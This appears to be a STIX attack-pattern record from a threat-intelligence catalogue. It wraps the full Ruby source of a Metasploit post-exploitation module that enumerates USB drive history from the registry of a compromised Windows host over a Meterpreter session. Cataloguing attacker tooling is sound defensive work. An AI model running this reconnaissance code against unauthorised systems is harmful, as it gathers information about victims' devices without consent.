{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c204ff17-32ff-4888-926c-8b7849cfed3a",
    "created": "2024-08-14T16:33:05.018366Z",
    "modified": "2024-08-14T16:33:05.01837Z",
    "name": "Windows Gather USB Drive History",
    "description": "This module will enumerate USB Drive history on a target host. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/usb_history.rb",
            "external_id": "usb_history.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather USB Drive History',\n        'Description' => %q{ This module will enumerate USB Drive history on a target host.},\n        'License' => MSF_LICENSE,\n        'Author' => [ 'nebulus'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    # Cache it so as to make it just a bit faster\n    isadmin = is_admin?\n\n    # enumerate disks for potentially tying to a drive letter later\n    @drives = enum_disks\n    out = \"\\n\"\n\n    @drives.each do |u, v|\n      out << sprintf(\"%5s\\t%75s\\n\", v, u.gsub(\"\\x00\", ''))\n    end\n\n    print_status(out)\n\n    usb_drive_classes = enum_subkeys('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR')\n    usb_uids_to_info = {}\n    if !usb_drive_classes.nil?\n      usb_drive_classes.each do |x|\n        enum_subkeys(x).each do |y|\n          vals = enum_values(y)\n          # enumerate each USB device used on the system\n          usb_uids_to_info.store(x.match(/HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR\\\\(.*)$/)[1], vals)\n        rescue StandardError\n        end\n      end\n\n      usb_uids_to_info.each do |u, v|\n        guid = '##?#USBSTOR#' << u << '#' << '{53f56307-b6bf-11d0-94f2-00a0c91efb8b}'\n        out = \"#{v['FriendlyName']}\\n\" << '=' * 85 << \"\\n\"\n        if isadmin\n          mace = registry_getkeylastwritetime('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceClasses\\\\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}\\\\' << guid)\n          if mace\n            keytime = ::Time.at(mace)\n          else\n            keytime = 'Unknown'\n          end\n          out << sprintf(\"%25s\\t%50s\\n\", 'Disk lpftLastWriteTime', keytime)\n        end\n        if !v.key?('ParentIdPrefix')\n          print_status(info_hash_to_str(out, v))\n          next\n        end\n        guid =\t'##?#STORAGE#RemoveableMedia#' << v['ParentIdPrefix'] << '&RM#' << '{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}'\n        if isadmin\n          mace = registry_getkeylastwritetime('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceClasses\\\\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\' << guid)\n          if mace\n            keytime = ::Time.at(mace)\n          else\n            keytime = 'Unknown'\n          end\n          out << sprintf(\"%25s\\t%50s\\n\", 'Volume lpftLastWriteTime', keytime)\n        end\n        print_status(info_hash_to_str(out, v))\n      end\n    else\n      print_error('No USB devices appear to have been connected to this host.')\n    end\n  end\n\n  #-------------------------------------------------------------------------------\n  # Function for querying the registry key for the last write time\n  #    key_str\t\tFull string representation of the key to be queried\n  #    returns\t\tunix timestamp in relation to epoch\n  def registry_getkeylastwritetime(key_str = nil)\n    return nil if !key_str\n\n    # RegQueryInfoKey - http://msdn.microsoft.com/en-us/library/ms724902%28v=vs.85%29.aspx\n    # last argument is PFILETIME lpftLastWriteTime, two DWORDS\n\n    # PFILETIME - http://msdn.microsoft.com/en-us/library/ms724284%28v=vs.85%29.aspx, two DWORDS   DWORD dwLowDateTime; DWORD dwHighDateTime;\n    #   can use Rex::Proto::SMB::Utils.time_smb_to_unix to convert to unix epoch\n    begin\n      r, b = session.sys.registry.splitkey(key_str)\n      key = session.sys.registry.open_key(r, b.to_s, KEY_READ)\n      mytime = session.railgun.advapi32.RegQueryInfoKeyA(key.hkey, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 8)['lpftLastWriteTime']\n      key.close\n      lo, hi = mytime.unpack('V2')\n      return Rex::Proto::SMB::Utils.time_smb_to_unix(hi, lo)\n    rescue StandardError\n      return nil\n    end\n  end\n\n  #-------------------------------------------------------------------------------\n  # Function to enumerate the next level of keys from the given key\n  #\tkey_str\t\tFull string representation of the key for which subkeys should be enumerated\n  #\treturns\t\tArray of string representations of subkeys\n  def enum_subkeys(key_str = nil)\n    return nil if !key_str\n\n    r, b = session.sys.registry.splitkey(key_str)\n    begin\n      key = session.sys.registry.open_key(r, b.to_s, KEY_READ)\n\n      full_keys = []\n      key.enum_key.each do |x|\n        full_keys.push(key_str.to_s << '\\\\' << x.to_s)\n      end\n\n      key.close\n    rescue StandardError\n      return nil\n    end\n    return full_keys\n  end\n\n  #-------------------------------------------------------------------------------\n  # Function to enumerate the values in the given key\n  #\tkey_str\t\tFull string representation of the key from which values should be enumerated\n  #\treturns\t\tHash of string representations of: Value.name => Value\n  def enum_values(key_str = nil)\n    return nil if !key_str\n\n    r, b = session.sys.registry.splitkey(key_str.to_s)\n    key = session.sys.registry.open_key(r, b.to_s, KEY_READ)\n    values = {}\n    key.enum_value.each do |x|\n      values.store(x.name, x.query)\n    end\n    key.close\n    return values\n  end\n\n  #--------------------------------------------------------------------------------------------------\n  # Function to enumerate the disks (not volumes) mounted as contained in HKLM\\System\\MountedDevices\n  #\treturns\t\tHash of string representations of: assigned drive letter => UID\n  def enum_disks\n    r, b = session.sys.registry.splitkey('HKLM\\\\SYSTEM\\\\MountedDevices')\n    key = session.sys.registry.open_key(r, b.to_s, KEY_READ)\n\n    ret = {}\n\n    values = key.enum_value\n    values.each do |x|\n      next if x.name !~ /\\\\DosDevices\\\\/\n\n      name = x.name\n      name = name.gsub('\\\\DosDevices\\\\', '')\n      value = x.query\n      if (value[0..0] != '\\\\')\n        str = ''\n        tmp = value.unpack('V')\n        tmp.each do |x|\n          str << \"Disk #{x.to_s(16)} \"\n        end\n        ret.store(str, name)\n      else\n        tmp = x.query\n        tmp.gsub!(/\\\\/, '')\n        tmp.gsub!(/\\?/, '')\n        ret.store(tmp, name)\n      end\n    end\n    key.close\n    return ret\n  end\n\n  def info_hash_to_str(str, hash)\n    out = str\n    out << sprintf(\"%25s\\t%50s\\n\", 'Manufacturer', hash['Mfg'])\n\n    if hash.key?('ParentIdPrefix')\n      mounted_as = nil\n\n      @drives.each do |x, y|\n        # go through mounted drives and see if this volume is mounted\n        next if x !~ /\\#/\t# truncated disk volume that doesnt apply to removable media\n\n        tmp = x.split(/\\#/)[2].gsub!(/\\x00/, '')\t# ParentIdPrefix will be 3rd item, trip internal \\x00\n        tmp.gsub!(/&RM$/i, '')\t\t# get rid of RM on end if its there\n        mounted_as = y if (tmp.downcase == hash['ParentIdPrefix'].downcase)\n      end\n\n      if mounted_as\n        out << sprintf(\"%25s\\t%50s (%5s)\\n\", 'ParentIdPrefix', hash['ParentIdPrefix'], mounted_as)\n      else\n        out << sprintf(\"%25s\\t%50s\\n\", 'ParentIdPrefix', hash['ParentIdPrefix'])\n      end\n    end\n\n    out << sprintf(\"%25s\\t%50s\\n\", 'Class', hash['Class'])\n    out << sprintf(\"%25s\\t%50s\\n\", 'Driver', hash['Driver'])\n    return out\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}